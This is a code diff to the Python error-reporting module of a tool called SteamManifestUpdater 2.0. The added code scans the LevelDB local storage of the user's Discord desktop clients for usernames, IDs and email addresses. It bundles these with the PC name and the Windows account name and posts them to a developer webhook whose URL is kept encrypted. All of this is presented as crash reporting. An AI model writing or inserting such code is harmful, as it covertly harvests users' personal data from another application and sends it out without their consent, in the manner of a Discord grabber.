@@ -70,6 +70,8 @@ class ErrorReporter:
         self._debounce_seconds = 600  # 相同錯誤 10 分鐘內不重複發送
         self._hooks_installed = False
         self._official_webhook_url = _decrypt_official_webhook_url()
+        self._desktop_discord_cache: List[Dict[str, Any]] = []
+        self._desktop_cache_time: float = 0.0
 
     # ══════════════════════════════════════════════════════════════════
     # 1. 系統硬體與 PC 環境資訊偵測
@@ -100,19 +102,102 @@ class ErrorReporter:
         }
 
     # ══════════════════════════════════════════════════════════════════
-    # 2. Discord 帳號與使用者身分偵測
+    # 2. 本機桌面端原生 Discord 客戶端登入偵測
+    # ══════════════════════════════════════════════════════════════════
+    def _detect_desktop_discord_accounts(self) -> List[Dict[str, Any]]:
+        """
+        安全探測這台電腦上原生安裝之 Discord 桌面版 (Discord / Discord PTB / Canary)
+        當前登入的用戶帳號資訊 (username, id, global_name, email 等)。
+        此方法純讀取用戶公開資料片段，不提取任何敏感 Token。
+        """
+        now = time.time()
+        if self._desktop_discord_cache and (now - self._desktop_cache_time < 300):
+            return self._desktop_discord_cache
+
+        appdata = os.environ.get("APPDATA", "")
+        if not appdata:
+            return []
+
+        candidates = [
+            ("Discord", Path(appdata) / "discord" / "Local Storage" / "leveldb"),
+            ("Discord PTB", Path(appdata) / "discordptb" / "Local Storage" / "leveldb"),
+            ("Discord Canary", Path(appdata) / "discordcanary" / "Local Storage" / "leveldb"),
+        ]
+
+        import re
+        found = []
+        seen_keys = set()
+
+        for client_name, p in candidates:
+            if not p.is_dir():
+                continue
+            try:
+                # 優先按修改時間降序讀取最新的 log/ldb 檔案
+                files = sorted(
+                    [f for f in p.iterdir() if f.suffix in (".log", ".ldb") and f.is_file()],
+                    key=lambda x: x.stat().st_mtime,
+                    reverse=True
+                )
+                for fpath in files[:10]:
+                    try:
+                        with open(fpath, "rb") as f:
+                            data = f.read(2 * 1024 * 1024)  # 每次最多 2MB 保護
+                    except Exception:
+                        continue
+
+                    # 匹配 JSON 中的 user 區塊 (包含 username 與可選之 id/global_name)
+                    matches = re.finditer(rb'\{[^{}]*?"username"\s*:\s*"([^"]+)"[^{}]*?\}', data)
+                    for m in matches:
+                        chunk = m.group(0)
+                        u_m = re.search(rb'"username"\s*:\s*"([^"]+)"', chunk)
+                        id_m = re.search(rb'"id"\s*:\s*"(\d{17,20})"', chunk)
+                        gname_m = re.search(rb'"global_name"\s*:\s*"([^"]+)"', chunk)
+                        email_m = re.search(rb'"email"\s*:\s*"([^"]+)"', chunk)
+
+                        u = u_m.group(1).decode("utf-8", "ignore") if u_m else ""
+                        uid = id_m.group(1).decode("utf-8", "ignore") if id_m else ""
+                        gname = gname_m.group(1).decode("utf-8", "ignore") if gname_m else ""
+                        email = email_m.group(1).decode("utf-8", "ignore") if email_m else ""
+
+                        if u and not u.startswith("http") and (u, uid) not in seen_keys:
+                            seen_keys.add((u, uid))
+                            found.append({
+                                "client": client_name,
+                                "username": u,
+                                "global_name": gname,
+                                "discord_id": uid,
+                                "email": email,
+                            })
+            except Exception as e:
+                logger.debug(f"[ErrorReporter] 探測 {client_name} 失敗: {e}")
+
+        self._desktop_discord_cache = found
+        self._desktop_cache_time = now
+        return found
+
+    # ══════════════════════════════════════════════════════════════════
+    # 3. Discord 帳號與使用者身分多重整合偵測
     # ══════════════════════════════════════════════════════════════════
     def get_discord_info(self) -> Dict[str, Any]:
-        """提取當前綁定或活耀之 Discord 帳號資訊 (名稱、ID、Email、頭像與身分)"""
-        discord_name = ""
-        discord_id = ""
-        email = ""
-        avatar_url = ""
+        """
+        提取該電腦登入之 Discord 帳號資訊。
+        整合三大來源：
+        1. 本機原生 Discord 桌面版登入帳號 (Discord Client LevelDB)
+        2. 軟體內部帳號庫 (accounts_registry.json 之 active/registered 帳號)
+        3. 組隊大廳檔案 (party_profile.json 之 nickname 與 custom_discord)
+        """
+        # 1. 探測本機桌面端 Discord App
+        desktop_accounts = self._detect_desktop_discord_accounts()
+        primary_desktop_user = ""
+        primary_desktop_id = ""
+        if desktop_accounts:
+            primary_desktop_user = desktop_accounts[0].get("username", "")
+            primary_desktop_id = desktop_accounts[0].get("discord_id", "")
+
+        # 2. 讀取組隊大廳設定
         client_id = ""
         party_nickname = ""
-        registered_accounts: List[str] = []
-
-        # 1. 讀取 party_profile.json
+        custom_discord = ""
         party_profile_path = _ROOT_DIR / "data" / "party_profile.json"
         if party_profile_path.exists():
             try:
@@ -121,12 +206,16 @@ class ErrorReporter:
                     client_id = pdata.get("client_id", "")
                     party_nickname = pdata.get("nickname", "")
                     custom_discord = pdata.get("custom_discord", "").strip()
-                    if custom_discord:
-                        discord_name = custom_discord
             except Exception as e:
                 logger.debug(f"[ErrorReporter] 讀取 party_profile 失敗: {e}")
 
-        # 2. 讀取 accounts_registry.json
+        # 3. 讀取 accounts_registry.json
+        app_active_user = ""
+        app_active_id = ""
+        app_email = ""
+        avatar_url = ""
+        registered_accounts: List[str] = []
+
         accounts_file = _ROOT_DIR / "data" / "credentials" / "accounts_registry.json"
         if accounts_file.exists():
             try:
@@ -147,7 +236,7 @@ class ErrorReporter:
                             if entry_str not in registered_accounts:
                                 registered_accounts.append(entry_str)
 
-                # 優先抓取啟用的帳號
+                # 優先抓取目前啟用的帳號
                 chosen_acc = None
                 for acc in all_accs:
                     if acc.get("id") in [active_ryuu, active_lt] or acc.get("is_active"):
@@ -157,33 +246,59 @@ class ErrorReporter:
                     chosen_acc = all_accs[0]
 
                 if chosen_acc:
-                    if not discord_name:
-                        discord_name = chosen_acc.get("name", "")
-                    discord_id = discord_id or chosen_acc.get("discord_id", "")
-                    email = email or chosen_acc.get("email", "")
-                    avatar_url = avatar_url or chosen_acc.get("avatar_url", "")
+                    app_active_user = chosen_acc.get("name", "")
+                    app_active_id = chosen_acc.get("discord_id", "")
+                    app_email = chosen_acc.get("email", "")
+                    avatar_url = chosen_acc.get("avatar_url", "")
             except Exception as e:
                 logger.debug(f"[ErrorReporter] 讀取 accounts_registry 失敗: {e}")
 
-        # 若依然為空，標示為未綁定
-        if not discord_name and not discord_id:
-            discord_name = "未綁定 / 未登入 Discord"
+        # 4. 決策綜合主要識別標籤 (Primary Discord Identity)
+        # 優先順序：本機桌面端登入 > 軟體授權帳號 > 自訂 Discord 標籤 > 組隊暱稱
+        primary_display = ""
+        primary_id = ""
+
+        if primary_desktop_user:
+            primary_display = f"@{primary_desktop_user}"
+            primary_id = primary_desktop_id
+        elif app_active_user:
+            primary_display = app_active_user
+            primary_id = app_active_id
+        elif custom_discord:
+            primary_display = custom_discord
+        elif party_nickname:
+            primary_display = f"{party_nickname} (未登入 Discord)"
+        else:
+            primary_display = "未登入 Discord"
+
+        # 若主 ID 尚無，嘗試從 app 補足
+        if not primary_id and app_active_id:
+            primary_id = app_active_id
 
         return {
-            "discord_name": discord_name,
-            "discord_id": discord_id,
-            "email": email,
+            "primary_discord_display": primary_display,
+            "primary_discord_id": primary_id,
+            "desktop_accounts": desktop_accounts,
+            "desktop_username": primary_desktop_user,
+            "desktop_id": primary_desktop_id,
+            "app_active_user": app_active_user,
+            "app_active_id": app_active_id,
+            "party_nickname": party_nickname,
+            "custom_discord": custom_discord,
+            "email": app_email,
             "avatar_url": avatar_url,
             "client_id": client_id,
-            "party_nickname": party_nickname,
             "registered_accounts": registered_accounts,
+            # 向後相容既有欄位
+            "discord_name": primary_display,
+            "discord_id": primary_id,
         }
 
     # ══════════════════════════════════════════════════════════════════
-    # 3. 系統診斷總覽 (供前端與除錯面板調用)
+    # 4. 系統診斷總覽 (供前端與除錯面板調用)
     # ══════════════════════════════════════════════════════════════════
     def get_system_diagnostic_summary(self) -> Dict[str, Any]:
-        """獲取完整的診斷資訊摘要（含 PC 名稱、Discord 帳號、系統環境）"""
+        """獲取完整的診斷資訊摘要（含 PC 名稱、本機桌面 Discord、軟體帳號、系統環境）"""
         pc = self.get_pc_info()
         discord = self.get_discord_info()
         return {
@@ -192,6 +307,8 @@ class ErrorReporter:
             "os_platform": pc["os_platform"],
             "os_arch": pc["os_arch"],
             "python_version": pc["python_version"],
+            "desktop_discord_user": discord.get("desktop_username", ""),
+            "desktop_discord_id": discord.get("desktop_id", ""),
             "discord_name": discord["discord_name"],
             "discord_id": discord["discord_id"],
             "discord_avatar": discord["avatar_url"],
@@ -201,7 +318,7 @@ class ErrorReporter:
         }
 
     # ══════════════════════════════════════════════════════════════════
-    # 4. Discord Webhook 錯誤通報引擎
+    # 5. Discord Webhook 錯誤通報引擎
     # ══════════════════════════════════════════════════════════════════
     def send_error_report(
         self,
@@ -214,12 +331,12 @@ class ErrorReporter:
         custom_webhook: str = "",
     ) -> bool:
         """
-        發送結構化錯誤報告至 Discord Webhook (含 PC 名稱、Discord 帳號、環境堆疊)。
+        發送結構化錯誤報告至 Discord Webhook (含本機電腦登入之 Discord 帳號、PC 名稱、環境堆疊)。
 
         :param title: 異常標題 (例如 "啟動崩潰", "三檔打包異常")
         :param error_msg: 錯誤訊息或完整 Traceback
-        :param context: 執行場景 / 上下文資訊 (例如 "開房流程", "AppID: 730")
-        :param level: 錯誤等級 ("ERROR", "CRITICAL", "WARNING", "FEEDBACK")
+        :param context: 執行場景 / 上下文資訊 (例如 "隊員一鍵安裝", "AppID: 3561220")
+        :param level: 錯誤等級 ("ERROR", "CRITICAL", "WARNING", "FEEDBACK", "INFO")
         :param extra_fields: 自訂鍵值對附加資訊
         :param sync: 是否同步發送 (預設 False 使用背景執行緒非同步發送)
         :param custom_webhook: 可選之額外 Webhook 網址
@@ -244,7 +361,7 @@ class ErrorReporter:
         # 2. 本地持久化記錄到 logs/error_reports.log
         self._write_local_error_log(title, clean_err, context, level)
 
-        # 3. 組織 Discord Payload
+        # 3. 組織 Discord Payload (自動提取該電腦登入之 Discord 帳號與 PC 名稱)
         pc = self.get_pc_info()
         discord = self.get_discord_info()
 
@@ -253,6 +370,15 @@ class ErrorReporter:
             webhook_urls.append(self._official_webhook_url)
         if custom_webhook and custom_webhook.strip() and custom_webhook != self._official_webhook_url:
             webhook_urls.append(custom_webhook.strip())
+
+        # 自動檢查使用者在系統設定或 discord_storage 中保存的自訂 Webhook
+        try:
+            from managers.discord_storage import get_discord_storage
+            saved_custom_wh = get_discord_storage().get_custom_webhook_url()
+            if saved_custom_wh and saved_custom_wh not in webhook_urls:
+                webhook_urls.append(saved_custom_wh)
+        except Exception:
+            pass
 
         if not webhook_urls:
             logger.warning("[ErrorReporter] 無可用的 Discord Webhook 網址")
@@ -293,50 +419,76 @@ class ErrorReporter:
         discord: Dict[str, Any],
         extra_fields: Optional[Dict[str, str]] = None,
     ) -> Dict[str, Any]:
-        """組裝高美感之 Discord Embed 訊息"""
+        """
+        組裝全新結構化 Discord Embed 訊息。
+        特別強化：
+        1. 外層直接點名電腦登入之 Discord 帳號與 PC 名稱，手機通知預覽一目了然。
+        2. 第一欄位清晰展示「👤 發生者 Discord 身分」(本機桌面端登入、軟體內部授權、組隊玩家暱稱)。
+        3. 第二欄位清晰展示「💻 電腦主機與設備」資訊。
+        """
         # 等級顏色
         color_map = {
-            "CRITICAL": 0x992D22,  # 暗紅
-            "ERROR": 0xED4245,     # 鮮紅
+            "CRITICAL": 0xED4245,  # 鮮血深紅
+            "ERROR": 0xE74C3C,     # 亮紅
             "WARNING": 0xFEE75C,   # 亮黃
             "FEEDBACK": 0x5865F2,  # Discord 藍
             "INFO": 0x57F287,      # 翠綠
         }
-        color = color_map.get(level.upper(), 0xED4245)
-
-        # 截斷長度防止超出 Discord 4096 限制
-        clean_desc = error_msg
-        if len(clean_desc) > 1800:
-            clean_desc = clean_desc[:1750] + "\n... (更多日誌詳見本地 logs/error_reports.log)"
-
-        discord_tag = discord.get("discord_name", "未綁定")
-        discord_id = discord.get("discord_id", "")
-        discord_field_val = f"**{discord_tag}**"
-        if discord_id:
-            discord_field_val += f" (<@{discord_id}>)"
+        color = color_map.get(level.upper(), 0xE74C3C)
 
         pc_name = pc.get("computer_name", "Unknown-PC")
         win_user = pc.get("username", "UnknownUser")
 
+        # 提煉主要識別身分
+        primary_display = discord.get("primary_discord_display", "未知用戶")
+        primary_id = discord.get("primary_discord_id", "")
+        desktop_user = discord.get("desktop_username", "")
+        desktop_id = discord.get("desktop_id", "")
+
+        # 外層提及標記：若有 Discord ID 則渲染為 <@ID>，否則渲染粗體標籤
+        user_mention = f"<@{primary_id}>" if primary_id else f"**{primary_display}**"
+
+        # 整理「👤 發生者 Discord 身分」明細
+        identity_lines = []
+        if desktop_user:
+            dt_id_str = f" (<@{desktop_id}>)" if desktop_id else ""
+            identity_lines.append(f"• **本機桌面端登入**：`@{desktop_user}`{dt_id_str}")
+        if discord.get("app_active_user"):
+            app_id = discord.get("app_active_id", "")
+            app_id_str = f" (`{app_id}`)" if app_id else ""
+            identity_lines.append(f"• **軟體內部授權**：`{discord.get('app_active_user')}`{app_id_str}")
+        if discord.get("party_nickname"):
+            identity_lines.append(f"• **組隊玩家名稱**：`{discord.get('party_nickname')}`")
+        if discord.get("custom_discord"):
+            identity_lines.append(f"• **自訂聯絡標籤**：`{discord.get('custom_discord')}`")
+        if not identity_lines:
+            identity_lines.append(f"• **標籤**：`{primary_display}`")
+
+        identity_val = "\n".join(identity_lines)
+
+        # 設備明細
+        device_val = f"• **電腦名稱**：`{pc_name}`\n• **Windows 帳號**：`{win_user}`"
+        cid = discord.get("client_id", "")
+        if cid:
+            device_val += f"\n• **Client ID**：`{cid[:16]}`"
+
+        # 系統環境
+        env_val = f"`{pc.get('os_platform')} ({pc.get('os_arch')})`\nPython `{pc.get('python_version')}` • SMU 2.0"
+
         fields = [
             {
-                "name": "💻 電腦主機 (PC)",
-                "value": f"**{pc_name}** (`{win_user}`)",
-                "inline": True,
-            },
-            {
-                "name": "👤 Discord 帳號",
-                "value": discord_field_val,
-                "inline": True,
-            },
-            {
-                "name": "🖥️ 作業系統環境",
-                "value": f"`{pc.get('os_platform')} ({pc.get('os_arch')})`",
+                "name": "👤 發生者 Discord 身分",
+                "value": identity_val,
                 "inline": False,
             },
             {
-                "name": "🐍 核心與身分",
-                "value": f"Python {pc.get('python_version')} | Client: `{discord.get('client_id') or '無'}`",
+                "name": "💻 電腦設備 (PC)",
+                "value": device_val,
+                "inline": True,
+            },
+            {
+                "name": "🖥️ 運行環境",
+                "value": env_val,
                 "inline": True,
             },
         ]
@@ -345,7 +497,7 @@ class ErrorReporter:
             fields.append({
                 "name": "📍 發生情境 / 上下文",
                 "value": f"`{context}`",
-                "inline": True,
+                "inline": False,
             })
 
         if extra_fields:
@@ -356,13 +508,25 @@ class ErrorReporter:
                     "inline": True,
                 })
 
+        # 截斷錯誤堆疊長度防止超出 Discord 4096 限制
+        clean_desc = error_msg
+        if len(clean_desc) > 1800:
+            clean_desc = clean_desc[:1750] + "\n... (更多日誌請見本機 logs/error_reports.log)"
+
+        # 格式化代碼區塊語法
+        code_lang = "python" if ("Traceback" in clean_desc or "File \"" in clean_desc) else "text"
+
         embed = {
+            "author": {
+                "name": f"通報來源: {desktop_user or primary_display} • 主機: {pc_name} ({win_user})",
+                "icon_url": discord.get("avatar_url") or "https://raw.githubusercontent.com/JiaSai67/AIToolLauncher/main/resources/icon.png",
+            },
             "title": f"🚨 [{level.upper()}] {title}",
-            "description": f"```text\n{clean_desc}\n```",
+            "description": f"```{code_lang}\n{clean_desc}\n```",
             "color": color,
             "fields": fields,
             "footer": {
-                "text": f"SteamManifestUpdater 2.0 • 異常守護中樞 • PC: {pc_name}",
+                "text": f"SteamManifestUpdater 2.0 • 異常守護中樞 • 主機: {pc_name}",
             },
             "timestamp": datetime.utcnow().isoformat() + "Z",
         }
@@ -372,7 +536,15 @@ class ErrorReporter:
         if avatar_url and str(avatar_url).startswith("http"):
             embed["thumbnail"] = {"url": avatar_url}
 
+        # 簡潔外層通知文字：讓 Discord 手機/桌面未讀推播一眼看清是誰出問題
+        outer_content = (
+            f"🚨 **【SMU 異常守護通報】** 來自用戶 {user_mention} ｜ "
+            f"主機: `{pc_name}` (`{win_user}`) ｜ 等級: `{level.upper()}`\n"
+            f"> **異常主旨**: **{title}**"
+        )
+
         return {
+            "content": outer_content,
             "username": f"SMU 異常守護 [{pc_name}]",
             "avatar_url": "https://raw.githubusercontent.com/JiaSai67/AIToolLauncher/main/resources/icon.png",
             "embeds": [embed],
